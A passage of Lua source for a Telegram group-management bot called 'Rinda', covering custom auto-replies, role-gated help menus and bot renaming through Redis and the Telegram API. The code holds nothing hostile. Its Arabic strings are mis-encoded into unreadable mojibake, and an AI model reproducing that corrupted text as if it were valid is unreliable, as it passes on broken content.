if text and (text == 'ุญุฐู ุฑุฏ ุนุงู' or text == 'โข ุญุฐู ุฑุฏ ุนุงู โ' or text == 'ูุณุญ ุฑุฏ ุนุงู' or text == 'ุญุฐู ุฑุฏ ูููู' or text == 'ูุณุญ ุฑุฏ ูููู' or text == 'ูุณุญ ุฑุฏ ูุทูุฑ' or text == 'ุญุฐู ุฑุฏ ูุทูุฑ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุทูุฑ ุงูุซุงููู ูุงุนูู ููุท ', 1, 'md')
return false
end
DevRio:set(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ูุญุฐููุง " ,  1, "md")
return false
end
if text and (text == 'ุงุถู ุฑุฏ ุนุงู' or text == 'โข ุงุถู ุฑุฏ ุนุงู โ' or text == 'ุงุถู ุฑุฏ ูููู' or text == 'ุงุถู ุฑุฏ ูุทูุฑ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:Rd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุงุถุงูู ุฑุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุทูุฑ ุงูุซุงููู ูุงุนูู ููุท ', 1, 'md')
else
DevRio:set(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุญุณูุง ุงุฑุณู ุงููููู ุงูุงู " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "ุงูุบุงุก" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ" ,  1, "md")
DevRio:del(Rinda..'Rio:Add:AllRed'..msg.sender_user_id_)
return false
end
Text = "โ๏ธฐุงุฑุณู ูู ุงูุฑุฏ ุณูุงุก ูุงู โข โค\nโจ ููู โข ููุตู โข ูุชุญุฑูู โข ุตูุฑู\n โข ููุฏูู โข ุจุตูู โข ุตูุช โข ุฑุณุงูู โฉ\nโ๏ธฐููููู ุงุถุงูุฉ ุงูู ุงููุต โข โค\n-----------------------------------------\n `#username` โฌ ูุนุฑู ุงููุณุชุฎุฏู\n `#msgs` โฌ ุนุฏุฏ ุงูุฑุณุงุฆู\n `#name` โฌ ุงุณู ุงููุณุชุฎุฏู\n `#id` โฌ ุงูุฏู ุงููุณุชุฎุฏู\n `#stast` โฌ ุฑุชุจุฉ ุงููุณุชุฎุฏู\n `#edit` โฌ ุนุฏุฏ ุงูุณุญูุงุช\n-----------------------------------------\nโ๏ธฐููุฎุฑูุฌ ุงุฑุณู โข ( ุงูุบุงุก )\n โ"
DevRio:set(Rinda.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevRio:set(Rinda.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevRio:sadd(Rinda.."Rio:Sudo:AllRed",text)
DevRio:set(Rinda.."DelSudoRep",text)
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุชุบูุฑ ุงูุฑุฏ โข",callback_data="/ChangeAllRed:"..msg.sender_user_id_}},{{text="โข ุงูุบุงุก โข",callback_data="/CancelAllRed:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู' and ChCheck(msg) then
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ูุงุนูู ููุท ', 1, 'md')
else
local redod = DevRio:smembers(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = 'โ๏ธฐูุงุฆูุฉ ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู โขโฏ\n-----------------------------------------\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) โข {*ุงูุนุฏุฏ โข '..#DevRio:smembers(Rinda..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = 'โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุชุนุฏุฏู ูุถุงูู'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == 'ุญุฐู ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู' or text == 'ูุณุญ ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:GpRd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏูุฏ ุงููุชุนุฏุฏู ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ุงู ุงุนูู ููุท ', 1, 'md')
else
local redod = DevRio:smembers(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุชุนุฏุฏู ูุถุงูู" ,  1, "md")
else
for k,v in pairs(redod) do
DevRio:del(Rinda..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุงูุฑุฏูุฏ ุงููุชุนุฏุฏู")  
return false
end
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == 'ุงูุฑุฏูุฏ' and Manager(msg) and ChCheck(msg) or text == 'ุฑุฏูุฏ ุงููุฏูุฑ' and Manager(msg) and ChCheck(msg) then
local redod = DevRio:smembers(Rinda..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = 'โ๏ธฐุฑุฏูุฏ ุงููุฏูุฑ โขโฏ\n-----------------------------------------\n'
for k,v in pairs(redod) do
if DevRio:get(Rinda.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'ูุชุญุฑูู ๐ญ'
elseif DevRio:get(Rinda.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'ุจุตูู ๐'
elseif DevRio:get(Rinda.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ููุตู ๐'
elseif DevRio:get(Rinda.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'ุฑุณุงูู โ'
elseif DevRio:get(Rinda.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'ุตูุฑู ๐'
elseif DevRio:get(Rinda.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'ููุฏูู ๐ฝ'
elseif DevRio:get(Rinda.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ููู ๐'
elseif DevRio:get(Rinda.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'ุงุบููู ๐ถ'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) โข {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '*โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู*'
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุฑุฏูุฏ ุงููุฏูุฑ โข",callback_data="/DelGpRed:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(MsgRep).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text and (text =='ุญุฐู ุงูุฑุฏูุฏ' or text == 'ูุณุญ ุงูุฑุฏูุฏ' or text == 'ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ' or text == 'ูุณุญ ุฑุฏูุฏ ุงููุฏูุฑ') and ChCheck(msg) then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:GpRd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุฏูุฑ ุงู ุงุนูู ููุท ', 1, 'md')
else
local redod = DevRio:smembers(Rinda..'Rio:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู" ,  1, "md")
else
for k,v in pairs(redod) do
DevRio:del(Rinda..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Video:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:File:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Text:GpRed'..v..msg.chat_id_)
DevRio:del(Rinda..'Rio:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุฑุฏูุฏ ุงููุฏูุฑ")  
return false
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if  text == "ุฑุฏูุฏ ุงููุทูุฑ" and SecondSudo(msg) or text == "ุงูุฑุฏูุฏ ุงูุนุงู" and SecondSudo(msg) or text == "ุฑุฏูุฏ ุงูุนุงู" and SecondSudo(msg) or text == "โข ุงูุฑุฏูุฏ ุงูุนุงู โ" and SecondSudo(msg) then
local redod = DevRio:smembers(Rinda.."Rio:Sudo:AllRed")
MsgRep = 'โ๏ธฐุฑุฏูุฏ ุงููุทูุฑ โขโฏ\n-----------------------------------------\n'
for k,v in pairs(redod) do
if DevRio:get(Rinda.."Rio:Gif:AllRed"..v) then
dp = 'ูุชุญุฑูู ๐ญ'
elseif DevRio:get(Rinda.."Rio:Voice:AllRed"..v) then
dp = 'ุจุตูู ๐'
elseif DevRio:get(Rinda.."Rio:Stecker:AllRed"..v) then
dp = 'ููุตู ๐'
elseif DevRio:get(Rinda.."Rio:Text:AllRed"..v) then
dp = 'ุฑุณุงูู โ'
elseif DevRio:get(Rinda.."Rio:Photo:AllRed"..v) then
dp = 'ุตูุฑู ๐'
elseif DevRio:get(Rinda.."Rio:Video:AllRed"..v) then
dp = 'ููุฏูู ๐ฝ'
elseif DevRio:get(Rinda.."Rio:File:AllRed"..v) then
dp = 'ููู ๐'
elseif DevRio:get(Rinda.."Rio:Audio:AllRed"..v) then
dp = 'ุงุบููู ๐ถ'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) โข {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '*โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู*'
end
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ูุณุญ ุฑุฏูุฏ ุงููุทูุฑ โข",callback_data="/DelGpRedAll:"..msg.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(MsgRep or redod).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text and (text == "ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ" or text == "ุญุฐู ุฑุฏูุฏ ุงูุนุงู" or text == "ูุณุญ ุฑุฏูุฏ ุงููุทูุฑ" or text == "โข ูุณุญ ุฑุฏูุฏ ุงูุนุงู โ") then
if not Bot(msg) and DevRio:get(Rinda..'Rio:Lock:GpRd'..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ ูุฐุงูู ุจุณุจุจ ุชุนุทููู', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูููุทูุฑ ุงูุซุงููู ุงู ุงุนูู ููุท ', 1, 'md')
else
local redod = DevRio:smembers(Rinda.."Rio:Sudo:AllRed")
if #redod == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุง ุชูุฌุฏ ุฑุฏูุฏ ูุถุงูู" ,  1, "md")
else
for k,v in pairs(redod) do
DevRio:del(Rinda.."Rio:Add:AllRed"..v)
DevRio:del(Rinda.."Rio:Gif:AllRed"..v)
DevRio:del(Rinda.."Rio:Voice:AllRed"..v)
DevRio:del(Rinda.."Rio:Audio:AllRed"..v)
DevRio:del(Rinda.."Rio:Photo:AllRed"..v)
DevRio:del(Rinda.."Rio:Stecker:AllRed"..v)
DevRio:del(Rinda.."Rio:Video:AllRed"..v)
DevRio:del(Rinda.."Rio:File:AllRed"..v)
DevRio:del(Rinda.."Rio:Text:AllRed"..v)
DevRio:del(Rinda.."Rio:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธฐุชู ุญุฐู ุฑุฏูุฏ ุงููุทูุฑ")  
return false
end
end 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text == "ุชุบููุฑ ุงุณู ุงูุจูุช" and ChCheck(msg) or text and text == "ูุถุน ุงุณู ุงูุจูุช" and ChCheck(msg) or text and text == "ุชุบูุฑ ุงุณู ุงูุจูุช" and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูู ุงุณู ุงูุจูุช ุงูุงู" ,  1, "md") 
DevRio:set(Rinda..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'ุญุฐู ุงุณู ุงูุจูุช' and ChCheck(msg) or text == 'ูุณุญ ุงุณู ุงูุจูุช' and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุจุณ ุงููุทูเขช ุงูุงุณุงุณู ูฺชุฏเขช ', 1, 'md')
else
DevRio:del(Rinda..'Rio:NameBot')
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชู ุญุฐู ุงุณู ุงูุจูุช'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text and text:match("^ุงุณุชุนุงุฏู ุงูุงูุงูุฑ$") and SecondSudo(msg) and ChCheck(msg) or text and text:match("^ุงุณุชุนุงุฏุฉ ููุงูุด ุงูุงูุงูุฑ$") and SecondSudo(msg) and ChCheck(msg) then
HelpList ={'Rio:Help','Rio:Help1','Rio:Help2','Rio:Help3','Rio:Help4','Rio:Help5','Rio:Help6'}
for i,Help in pairs(HelpList) do
DevRio:del(Rinda..Help) 
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุณุชุนุงุฏุฉ ุงูููุงูุด ุงูุงุตููู" ,  1, "md") 
end
if text == "ุชุนููู ุงูุงูุงูุฑ" and SecondSudo(msg) and ChCheck(msg) or text == "ุชุนููู ุงูุฑ ุงูุงูุงูุฑ" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ุงูุงูุงูุฑ) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help0'..msg.sender_user_id_)
if RindaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help0'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
return false end
end
if text == "ุงูุงูุงูุฑ" and ChCheck(msg) or text == "ุงูุงูุฑ" and ChCheck(msg) or text == "ูุณุงุนุฏู" and ChCheck(msg) then
local Help = DevRio:get(Rinda..'Rio:Help')
local Text = [[
๐ง:ูููู ุจเขชู ุจูุงุฆูู ุงูุงูเขช เขชููุฏุง 
-----------------------------------------
โข๏ธฐุงูุงูเขช ุงูุญูุงูู
โข๏ธฐุงูุงูเขช ุงูุงุฏูููู
โข๏ธฐุงูุงูเขช ุงููุฏุฑุงุก
โข๏ธฐุงูุงูเขช ุงูููุดุฆูู
โข๏ธฐุงูุงูเขช ุงููุทูุฑูู
โข๏ธฐุงูุงูเขช ุงูุงุนุถุงุก
-----------------------------------------โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]] 
keyboard = {} 
if SudoBot(msg) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุทูุฑูู โข",callback_data="/HelpList5:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุฑุชุจ โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text="โข ุงูุชูุนูู ู ุงูุชุนุทูู โข",callback_data="/lockorder:"..msg.sender_user_id_},{text="โข ุงูููู ู ุงููุชุญ โข",callback_data="/locklist:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
elseif Constructor(msg) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูููุดุฆูู โข",callback_data="/HelpList4:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุฑุชุจ โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text="โข ุงูุชูุนูู ู ุงูุชุนุทูู โข",callback_data="/lockorder:"..msg.sender_user_id_},{text="โข ุงูููู ู ุงููุชุญ โข",callback_data="/locklist:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
elseif Manager(msg) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงููุฏุฑุงุก โข",callback_data="/HelpList3:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุฑุชุจ โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text="โข ุงูุชูุนูู ู ุงูุชุนุทูู โข",callback_data="/lockorder:"..msg.sender_user_id_},{text="โข ุงูููู ู ุงููุชุญ โข",callback_data="/locklist:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
elseif Admin(msg) then
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุฏูููู โข",callback_data="/HelpList2:"..msg.sender_user_id_},{text="โข ุงูุงูุฑ ุงูุญูุงูู โข",callback_data="/HelpList1:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..msg.sender_user_id_}},{{text="โข ุงูุงูุฑ ุงูุฑุชุจ โข",callback_data="/DelList:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
else
keyboard.inline_keyboard = {{{text="โข ุงูุงูุฑ ุงูุงุนุถุงุก โข",callback_data="/HelpList6:"..msg.sender_user_id_}},{{text="โข ุงุฎูุงุก ุงููููุดู โข",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
end
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "ุชุนููู ุงูุฑ ู1" and SecondSudo(msg) and ChCheck(msg) or text == "ุชุนููู ุงูุฑ ููก" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ู1) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help01'..msg.sender_user_id_)
if RindaTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help01'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
return false end
end
if text == "ู1" or text == "ููก" or text == "ุงูุงูุฑ1" or text == "ุงูุงูุฑูก" then
if not Admin(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธฐุงุฑุณู โข (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = DevRio:get(Rinda..'Rio:Help1')
local Text = [[
โ๏ธฐุงูุงูุฑ ุญูุงูุฉ ุงููุฌููุนู โข โค
-----------------------------------------
โ๏ธฐููู โข ูุชุญ โข ุงูุฑูุงุจุท
โ๏ธฐููู โข ูุชุญ โข ุงููุนุฑูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูุจูุชุงุช
โ๏ธฐููู โข ูุชุญ โข ุงููุชุญุฑูู
โ๏ธฐููู โข ูุชุญ โข ุงูููุตูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงููููุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูุตูุฑ
โ๏ธฐููู โข ูุชุญ โข ุงูููุฏูู
โ๏ธฐููู โข ูุชุญ โข ุงูุงูููุงูู
โ๏ธฐููู โข ูุชุญ โข ุงูุฏุฑุฏุดู
โ๏ธฐููู โข ูุชุญ โข ุงูุชูุฌูู
โ๏ธฐููู โข ูุชุญ โข ุงูุงุบุงูู
โ๏ธฐููู โข ูุชุญ โข ุงูุตูุช
โ๏ธฐููู โข ูุชุญ โข ุงูุฌูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงููุงุฑูุฏุงูู
โ๏ธฐููู โข ูุชุญ โข ุงูุชูุฑุงุฑ
โ๏ธฐููู โข ูุชุญ โข ุงููุงุดุชุงู
โ๏ธฐููู โข ูุชุญ โข ุงูุชุนุฏูู
โ๏ธฐููู โข ูุชุญ โข ุงูุชุซุจูุช
โ๏ธฐููู โข ูุชุญ โข ุงูุงุดุนุงุฑุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูููุงูุด
โ๏ธฐููู โข ูุชุญ โข ุงูุฏุฎูู
โ๏ธฐููู โข ูุชุญ โข ุงูุดุจูุงุช
โ๏ธฐููู โข ูุชุญ โข ุงูููุงูุน
โ๏ธฐููู โข ูุชุญ โข ุงููุดุงุฑ
โ๏ธฐููู โข ูุชุญ โข ุงูููุฑ
โ๏ธฐููู โข ูุชุญ โข ุงูุทุงุฆููู
โ๏ธฐููู โข ูุชุญ โข ุงููู
โ๏ธฐููู โข ูุชุญ โข ุงูุนุฑุจูู
โ๏ธฐููู โข ูุชุญ โข ุงูุงููููุฒูู
โ๏ธฐููู โข ูุชุญ โข ุงููุงุฑุณูู
โ๏ธฐููู โข ูุชุญ โข ุงูุชูููุด
-----------------------------------------
โ๏ธฐุงูุงูุฑ ุญูุงูู ุงุฎุฑู โข โค
-----------------------------------------
โ๏ธฐููู โข ูุชุญ + ุงูุงูุฑ โข โค
โ๏ธฐุงูุชูุฑุงุฑ ุจุงูุทุฑุฏ
โ๏ธฐุงูุชูุฑุงุฑ ุจุงููุชู
โ๏ธฐุงูุชูุฑุงุฑ ุจุงูุชููุฏ
โ๏ธฐุงููุงุฑุณูู ุจุงูุทุฑุฏ
โ๏ธฐุงูุจูุชุงุช ุจุงูุทุฑุฏ
โ๏ธฐุงูุจูุชุงุช ุจุงูุชููุฏ
-----------------------------------------
โ๏ธฐ[โ ๐ฑ๐๐๐ฃ๐บ ๐ฒ](https://t.me/Source_Rinda)
]]
Dev_Rio(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "ุชุนููู ุงูุฑ ู2" and SecondSudo(msg) and ChCheck(msg) or text == "ุชุนููู ุงูุฑ ููข" and SecondSudo(msg) and ChCheck(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ูููุดุฉ (ู2) ุงูุงู " ,  1, "md")
DevRio:set(Rinda..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local RindaTeam =  DevRio:get(Rinda..'Rio:Help21'..msg.sender_user_id_)
if RindaTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(Rinda..'Rio:Help21'..msg.sender_user_id_)
DevRio:set(Rinda..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญูุธ ุงููููุดู ุงูุฌุฏูุฏู " ,  1, "md")
return false end
end
if text == "ู2" and ChCheck(msg) or text == "ููข" and ChCheck(msg) or text == "ุงูุงูุฑ2" and ChCheck(msg) or text == "ุงูุงูุฑูข" and ChCheck(msg) then
if not Admin(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุฐุง ุงูุงูุฑ ูุฎุต ุงูุฑุชุจ ุงูุงุนูู ููุท\nโ๏ธฐุงุฑุณู โข (ู6) ูุนุฑุถ ุงูุงูุฑ ุงูุงุนุถุงุก', 1, 'md')
else
local Help = DevRio:get(Rinda..'Rio:Help2')
local Text = [[
โ๏ธฐุงูุงูุฑ ุงูุงุฏูููู โข โค
-----------------------------------------
โ๏ธฐุงูุงุนุฏุงุฏุช
โ๏ธฐุชุงู ูููู 
